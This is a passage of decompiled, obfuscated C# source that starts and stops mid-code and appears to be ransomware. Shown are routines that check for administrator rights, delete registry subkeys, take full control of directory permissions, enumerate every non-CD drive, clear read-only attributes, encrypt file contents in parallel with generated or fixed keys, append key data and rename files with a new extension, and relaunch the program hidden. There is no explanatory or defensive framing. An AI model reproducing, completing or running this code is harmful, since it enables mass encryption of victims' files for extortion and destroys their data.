			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string lriPjsqAmcxvJg(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void atwbVslgnr()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = KCuOidVYGqyU(getString_0(107391534));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SkTISxbocVBV(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107391428)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107391371)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107391386)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107391361)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107391568)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107390824)));
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107390763)));
					registryKey.Close();
				}
				string_ = KCuOidVYGqyU(getString_0(107390778));
				registryKey = Registry.LocalMachine.OpenSubKey(SkTISxbocVBV(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107390681)));
					registryKey.Close();
				}
				string_ = KCuOidVYGqyU(getString_0(107390664));
				registryKey = Registry.LocalMachine.OpenSubKey(SkTISxbocVBV(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107390681)));
					registryKey.Close();
				}
				string_ = KCuOidVYGqyU(getString_0(107390664));
				registryKey = Registry.CurrentUser.OpenSubKey(SkTISxbocVBV(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SkTISxbocVBV(getString_0(107390681)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107390615)), SkTISxbocVBV(getString_0(107390630)));
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107391061)), SkTISxbocVBV(getString_0(107391052)));
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107391061)), SkTISxbocVBV(getString_0(107390938)));
			sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107390877)), SkTISxbocVBV(getString_0(107390828)));
		}
		catch
		{
		}
	}

	public static void TpkMkTwVPbqk(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(SkTISxbocVBV(getString_0(107390275)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void fdRBVCGmbW()
	{
		sonqSVTFpSTJ(getString_0(107396755), SkTISxbocVBV(getString_0(107390218)));
		string text = SkTISxbocVBV(getString_0(107390568));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391111) + text + getString_0(107391111) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396755);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void QDEaHvSclYy(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390503) + string_0 + getString_0(107390494) + ex.Message + getString_0(107396211));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string ttCQNydAdpXDD()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393973);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390405);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390428))) ? getString_0(107390378) : getString_0(107390387));
				break;
			case 0:
				text = getString_0(107390433);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390400);
				break;
			case 4:
				text = getString_0(107390355);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390369) : getString_0(107390346));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107390313) : getString_0(107390318)) : getString_0(107390323)) : getString_0(107390364));
				break;
			case 10:
				text = getString_0(107390340);
				break;
			}
		}
		if (text != getString_0(107393973))
		{
			text = getString_0(107390335) + text;
			if (oSVersion.ServicePack != getString_0(107393973))
			{
				text = text + getString_0(107393119) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string QhAvpXgxGFPhG(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395369);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(SkTISxbocVBV(getString_0(107395368)));
				streamWriter.WriteLine(getString_0(107396211));
				streamWriter.WriteLine(SkTISxbocVBV(getString_0(107394438)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393784) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107389778) + ex.Message + getString_0(107396211));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void QzKMgEkrVbz(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		NxxRNZAmqtpJW.nXYhxFpZYJHvd CS_0024_003C_003E8__locals0 = new NxxRNZAmqtpJW();
		CS_0024_003C_003E8__locals0.LmIrJobSdpRefhg = string_1;
		CS_0024_003C_003E8__locals0.fzyurTayzyx = string_2;
		CS_0024_003C_003E8__locals0.BHymqukOWiIOq = string_3;
		CS_0024_003C_003E8__locals0.CoonlmIjtAamR = string_4;
		uoLtoKgRiGap = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.BHymqukOWiIOq);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396540))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !jdESWHKNpYUqO.Contains(array[i].Name))
					{
						jdESWHKNpYUqO.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!jdESWHKNpYUqO.Contains(string_0[j]))
				{
					jdESWHKNpYUqO.Add(string_0[j]);
				}
			}
		}
		if (jdESWHKNpYUqO.Contains(SkTISxbocVBV(getString_0(107389753))) && SrbILrUeaGGbz == getString_0(107396902))
		{
			jdESWHKNpYUqO.Remove(SkTISxbocVBV(getString_0(107389753)));
		}
		Parallel.ForEach(jdESWHKNpYUqO, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NxxRNZAmqtpJW.nXYhxFpZYJHvd();
			CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.moBwbkrMSyCz = string_0;
			if (zqdqllncQgP && !ttCQNydAdpXDD().Contains(NxxRNZAmqtpJW.getString_0(107390378)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ufbOltmzDN(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.moBwbkrMSyCz);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (kRzbTYvNtBEG == NxxRNZAmqtpJW.getString_0(107396911))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lquvbpUvjvFz(CS_0024_003C_003E8__locals0.moBwbkrMSyCz, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.LmIrJobSdpRefhg, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.CoonlmIjtAamR, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.fzyurTayzyx, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.BHymqukOWiIOq);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lquvbpUvjvFz(CS_0024_003C_003E8__locals0.moBwbkrMSyCz, CS_0024_003C_003E8__locals0.LmIrJobSdpRefhg, CS_0024_003C_003E8__locals0.CoonlmIjtAamR, CS_0024_003C_003E8__locals0.fzyurTayzyx, CS_0024_003C_003E8__locals0.BHymqukOWiIOq);
			}
		});
	}

	public static void lquvbpUvjvFz(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393973));
		List<string> list3 = list2;
		if (NGOGExOuNfek == getString_0(107396359))
		{
			list = nONyHXDbKGYoc(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = zbGxTiflfzgZwgnKM.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((kzGxNvucvTtI == getString_0(107396359) && !item.EndsWith(text)) || joYcYYfKPdeY.Contains(item))
				{
					continue;
				}
				if (ZSgNOgHAnNUh == getString_0(107396902))
				{
					try
					{
						if (cEKjxJpvzJxmFm.RWzgedrwjujkxJVML(item))
						{
							cEKjxJpvzJxmFm.uOexIIPzrYipv(item);
						}
					}
					catch
					{
					}
				}
				joYcYYfKPdeY.Add(item);
				if (!zctpFYIogjdJ.Contains(Path.GetDirectoryName(item)))
				{
					zctpFYIogjdJ.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (mvPdeZrEDWt == getString_0(107396902) && fileStream.Length > Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024 && !list3.Contains(text))
					{
						if (roOXwZlrCIU == getString_0(107396902))
						{
							foreach (string item2 in KtFLKdivITUMrO)
							{
								if (item.ToLower().EndsWith(item2) && LIsjhaBFCgPZ == getString_0(107396902))
								{
									if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LIsjhaBFCgPZ == getString_0(107396359))
								{
									try
									{
										VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = NvljFLVXzJtPi.gMAlEqhWoafK(item, Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024);
						byte[] urmCgduHwRwh = NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						NvljFLVXzJtPi.FHeidwHVLLD(item, urmCgduHwRwh);
						if (string_2 != getString_0(107389712))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389712))
					{
						VDsJZPQbwwp(item, item + string_2, uoLtoKgRiGap);
					}
					else
					{
						VDsJZPQbwwp(item, item + getString_0(107389707), uoLtoKgRiGap);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void gOdPITLyyJACl(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		vKcpWEFEAjeH.edSVUkajiiBQ CS_0024_003C_003E8__locals0 = new vKcpWEFEAjeH();
		CS_0024_003C_003E8__locals0.RAObKroldugiJ = list_0;
		CS_0024_003C_003E8__locals0.hRiNsPrmWAghH = string_1;
		CS_0024_003C_003E8__locals0.QWGxTDMTtO = string_2;
		CS_0024_003C_003E8__locals0.AxoZwXttJq = string_3;
		CS_0024_003C_003E8__locals0.mQEpTzdwUJx = new List<string> { getString_0(107393973) };
		if (kzGxNvucvTtI == getString_0(107396359))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.RAObKroldugiJ)
				{
					if (CS_0024_003C_003E8__locals0.QWGxTDMTtO.Length != 0)
					{
						string[] qWGxTDMTtO2 = CS_0024_003C_003E8__locals0.QWGxTDMTtO;
						int num2 = 0;
						while (num2 < qWGxTDMTtO2.Length)
						{
							string value2 = qWGxTDMTtO2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.hRiNsPrmWAghH))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !joYcYYfKPdeY.Contains(item))
					{
						if (ZSgNOgHAnNUh == vKcpWEFEAjeH.getString_0(107396919))
						{
							try
							{
								if (cEKjxJpvzJxmFm.RWzgedrwjujkxJVML(item))
								{
									cEKjxJpvzJxmFm.uOexIIPzrYipv(item);
								}
							}
							catch
							{
							}
						}
						joYcYYfKPdeY.Add(item);
						if (!zctpFYIogjdJ.Contains(Path.GetDirectoryName(item)))
						{
							zctpFYIogjdJ.Add(Path.GetDirectoryName(item));
						}
						QDEaHvSclYy(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (ypofoMoLMAIop)
								{
									try
									{
										File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + item + vKcpWEFEAjeH.getString_0(107407206) + ex12.Message + vKcpWEFEAjeH.getString_0(107396228));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (mvPdeZrEDWt == vKcpWEFEAjeH.getString_0(107396919) && new FileInfo(item).Length > Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.mQEpTzdwUJx.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new vKcpWEFEAjeH.SvDYehIidN();
								CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH);
									}
								}
								catch (Exception ex14)
								{
									if (!ypofoMoLMAIop)
									{
										break;
									}
									try
									{
										File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + item + vKcpWEFEAjeH.getString_0(107407145) + ex14.Message + vKcpWEFEAjeH.getString_0(107396228));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = vKcpWEFEAjeH.getString_0(107393990);
								if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
								{
									CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH;
								}
								else
								{
									CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = item;
								}
								if (roOXwZlrCIU == vKcpWEFEAjeH.getString_0(107396919))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in KtFLKdivITUMrO)
										{
											if (CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == vKcpWEFEAjeH.SvDYehIidN.getString_0(107396922))
											{
												if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ).Length)
												{
													try
													{
														VLhifxtGlnnIec.OoNgWYAVfA(vKcpWEFEAjeH.SvDYehIidN.getString_0(107394106), vKcpWEFEAjeH.SvDYehIidN.getString_0(107394101), vKcpWEFEAjeH.SvDYehIidN.getString_0(107394056), CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ.ToLower().EndsWith(item2) && LIsjhaBFCgPZ == vKcpWEFEAjeH.SvDYehIidN.getString_0(107396379))
											{
												try
												{
													VLhifxtGlnnIec.OoNgWYAVfA(vKcpWEFEAjeH.SvDYehIidN.getString_0(107394106), vKcpWEFEAjeH.SvDYehIidN.getString_0(107394101), vKcpWEFEAjeH.SvDYehIidN.getString_0(107394056), CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = TVJVYBTbELDF.dgXrAjujXbg(32);
								string s3 = hTchmIjujxwM.GMfqOAiITqajuCI(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = NvljFLVXzJtPi.gMAlEqhWoafK(CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ, Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024);
								NvljFLVXzJtPi.FHeidwHVLLD(urmCgduHwRwh: (!nwAWCtCxbxlBvogQ) ? (tcfvsNKQegWI ? NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tcfvsNKQegWI ? ziPgVxfWfuZ.raaExrXtGHRqGg(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ziPgVxfWfuZ.raaExrXtGHRqGg(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DXMwgOcsXZpsKTv: CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ, syxKqcQzfEI: bytes3);
							}
							else
							{
								string text4 = TVJVYBTbELDF.dgXrAjujXbg(32);
								string s4 = hTchmIjujxwM.GMfqOAiITqajuCI(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
								{
									if (!daZUEUUguJZ)
									{
										if (!tcfvsNKQegWI)
										{
											OWjMVugaEAAi(item, item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, uoLtoKgRiGap);
										}
										else
										{
											OWjMVugaEAAi(item, item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!tcfvsNKQegWI)
											{
												qqsrsxcqEleW(item, item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, uoLtoKgRiGap);
											}
											else
											{
												qqsrsxcqEleW(item, item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (ypofoMoLMAIop)
											{
												try
												{
													File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + item + vKcpWEFEAjeH.getString_0(107389747) + ex16.Message + vKcpWEFEAjeH.getString_0(107396228));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!daZUEUUguJZ)
								{
									if (!tcfvsNKQegWI)
									{
										OWjMVugaEAAi(item, item + vKcpWEFEAjeH.getString_0(107389724), uoLtoKgRiGap);
									}
									else
									{
										OWjMVugaEAAi(item, item + vKcpWEFEAjeH.getString_0(107389724), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!tcfvsNKQegWI)
										{
											qqsrsxcqEleW(item, item, uoLtoKgRiGap);
										}
										else
										{
											qqsrsxcqEleW(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (ypofoMoLMAIop)
										{
											try
											{
												File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + item + vKcpWEFEAjeH.getString_0(107389747) + ex18.Message + vKcpWEFEAjeH.getString_0(107396228));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (tcfvsNKQegWI)
								{
									if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
									{
										TpkMkTwVPbqk(item + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, bytes4);
									}
									else
									{
										TpkMkTwVPbqk(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.RAObKroldugiJ.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.RAObKroldugiJ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new vKcpWEFEAjeH.edSVUkajiiBQ();
			CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD = string_0;
			if (CS_0024_003C_003E8__locals0.QWGxTDMTtO.Length != 0)
			{
				string[] qWGxTDMTtO = CS_0024_003C_003E8__locals0.QWGxTDMTtO;
				int num = 0;
				while (num < qWGxTDMTtO.Length)
				{
					string value = qWGxTDMTtO[num];
					if (!CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.EndsWith(CS_0024_003C_003E8__locals0.hRiNsPrmWAghH))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!joYcYYfKPdeY.Contains(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD))
			{
				if (ZSgNOgHAnNUh == vKcpWEFEAjeH.getString_0(107396919))
				{
					try
					{
						if (cEKjxJpvzJxmFm.RWzgedrwjujkxJVML(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD))
						{
							cEKjxJpvzJxmFm.uOexIIPzrYipv(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
						}
					}
					catch
					{
					}
				}
				joYcYYfKPdeY.Add(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
				if (!zctpFYIogjdJ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD)))
				{
					zctpFYIogjdJ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD));
				}
				QDEaHvSclYy(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (ypofoMoLMAIop)
						{
							try
							{
								File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107407206) + ex2.Message + vKcpWEFEAjeH.getString_0(107396228));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (mvPdeZrEDWt == vKcpWEFEAjeH.getString_0(107396919) && new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length > Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
							{
								File.Move(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH);
							}
						}
						catch (Exception ex4)
						{
							if (ypofoMoLMAIop)
							{
								try
								{
									File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107407145) + ex4.Message + vKcpWEFEAjeH.getString_0(107396228));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
						{
							CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD += CS_0024_003C_003E8__locals0.hRiNsPrmWAghH;
						}
						if (roOXwZlrCIU == vKcpWEFEAjeH.getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in KtFLKdivITUMrO)
								{
									if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107396925))
									{
										if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length)
										{
											try
											{
												VLhifxtGlnnIec.OoNgWYAVfA(vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394109), vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394104), vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394059), CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.ToLower().EndsWith(item3) && LIsjhaBFCgPZ == vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107396382))
									{
										try
										{
											VLhifxtGlnnIec.OoNgWYAVfA(vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394109), vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394104), vKcpWEFEAjeH.edSVUkajiiBQ.getString_0(107394059), CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s = hTchmIjujxwM.GMfqOAiITqajuCI(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = NvljFLVXzJtPi.gMAlEqhWoafK(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024);
						NvljFLVXzJtPi.FHeidwHVLLD(urmCgduHwRwh: (!nwAWCtCxbxlBvogQ) ? (tcfvsNKQegWI ? NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tcfvsNKQegWI ? ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DXMwgOcsXZpsKTv: CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, syxKqcQzfEI: bytes);
					}
					else
					{
